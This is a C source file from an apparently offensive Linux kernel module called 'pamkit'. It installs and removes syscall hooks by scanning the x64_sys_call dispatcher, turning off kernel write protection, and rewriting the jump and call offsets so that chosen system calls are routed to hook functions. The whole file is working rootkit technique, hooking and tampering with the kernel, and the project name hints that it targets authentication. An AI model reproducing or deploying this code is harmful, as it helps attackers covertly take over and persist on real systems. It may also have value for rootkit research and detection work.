#include "helpers.h"

#if defined(PAMKIT_SWITCH_PATCHING_SYSCALL_HOOKING)

int install_syscall_hooks(hook_data_t syscall_hooks[]);
int uninstall_syscall_hooks(hook_data_t syscall_hooks[]);

#include <asm/syscall.h>

/**
 * Which instruction we need to look for exactly differs between kernel versions / how
 * a kernel was compiled.
 * You can find it out by inspecting the disassembled 'x64_sys_call' function, e.g.
 * >> objdump --disassemble=x64_sys_call vmlinux-6.12.57+deb13-amd64
 *
 * It should be either 0xE9 (near  relative jump) or 0xE8 (call)
 */
#define TARGET_INSTRUCTION 0xe9
#define DISPATCH_DUMP_SIZE 0x5000

static uint8_t *dispatcher_dump = NULL;

static void
patch_syscall_dispatch_site(hook_data_t *hook, void *dispatcher_base_addr, size_t instr_offset)
{
    /**
     * The instruction we patch has the format:
     *  | op-code (1 byte) | relative offset (4 bytes) |
     *
     * The target addr, i.e. where the instructions jumps to, is computed as:
     *  addr_of_following_instruction + relative_offset
     */

     pamkit_disable_write_protection();

     /* 'dispatcher_base_addr + instr_offset + 5' points to the next instruction (i.e. the one after the jmp/call that we want to patch) */
     const int32_t rel_offset_to_hook_function = ((uintptr_t)hook->hook_function_addr) - ((uintptr_t) dispatcher_base_addr + instr_offset + 5);
     prdebug("Relative offset to the hook function: %x", rel_offset_to_hook_function);

     const int32_t offset_to_original_syscall = *(int32_t *) (dispatcher_dump + instr_offset + 1);
     hook->original_offset = offset_to_original_syscall;
     hook->offset_memory_addr = (void *) (dispatcher_dump + instr_offset + 1);
     prdebug("Relative offset to the original syscall implementation: %x", offset_to_original_syscall);

     /* Overwrite the current offset stored in 0xE8/9 B1 B2 B3 B4 with the offset to our hook */
     memcpy(dispatcher_dump + instr_offset + 1, &rel_offset_to_hook_function,  sizeof(rel_offset_to_hook_function));

     pamkit_enable_write_protection();
}

int
install_syscall_hooks(hook_data_t syscall_hooks[])
{
    prdebug("Attempting to install syscall hooks...");

    sys_call_ptr_t *__syscall_table = (sys_call_ptr_t *) pamkit_lookup_symbol_addr("sys_call_table");
    if (!__syscall_table) {
        prerr("Failed to get handle to system call table");
        return PAMKIT_GENERIC_ERROR;
    }

    void *syscall_dispatcher = pamkit_lookup_symbol_addr("x64_sys_call");
    if (!syscall_dispatcher) {
        prerr("Failed to get handle to 'x64_sys_call'");
        return PAMKIT_GENERIC_ERROR;
    }

    dispatcher_dump = (uint8_t *) syscall_dispatcher;

    for (size_t i = 0; i < DISPATCH_DUMP_SIZE-4; ++i) {

        if (dispatcher_dump[i] == TARGET_INSTRUCTION) {
            int32_t relative_offset = *(int32_t *) (dispatcher_dump + i + 1);
            void *target_addr = (void *) ((uintptr_t) syscall_dispatcher + i + 5 + relative_offset);

            if (!virt_addr_valid(target_addr)) {
                continue;
            }

            hook_data_t *hook = &syscall_hooks[0];
            while (hook->hook_function_addr) {

                if (target_addr == (void *) __syscall_table[hook->syscall_table_index]) {
                    prdebug("Found dispatch position for '%s' at addr '0x%px'", hook->name, (void *) (syscall_dispatcher + i));

                    *(hook->orig_function_addr) = (uintptr_t) __syscall_table[hook->syscall_table_index];
                    patch_syscall_dispatch_site(hook, syscall_dispatcher, i);

                    prdebug("Patched %s's dispatch site", hook->name);
                }

                hook++;
            }
        }
    }

    prdebug("Successfully installed the syscall hooks!");
    return PAMKIT_GENERIC_SUCCESS;
}

int
uninstall_syscall_hooks(hook_data_t syscall_hooks[])
{
    prdebug("Attempting to remove any installed syscall hooks...");

    if (!dispatcher_dump) {
        prwarn("The 'dispatcher_dump' is not initialized, so no syscalls could've been hooked");
        return PAMKIT_GENERIC_SUCCESS;
    }

    hook_data_t *hook = &syscall_hooks[0];
    while (hook->hook_function_addr) {

        if (hook->original_offset > 0 && hook->offset_memory_addr) {
            prinfo("Writing offset '%x' to address '0x%px'", hook->original_offset, (void *) hook->offset_memory_addr);

            pamkit_disable_write_protection();
            memcpy(hook->offset_memory_addr, &(hook->original_offset), sizeof(hook->original_offset));
            pamkit_enable_write_protection();
        }

        hook++;
    }

    prdebug("Successfully de-registered the installed syscall hooks!");
    return PAMKIT_GENERIC_SUCCESS;
}

#endif /* PAMKIT_SWITCH_PATCHING_SYSCALL_HOOKING */
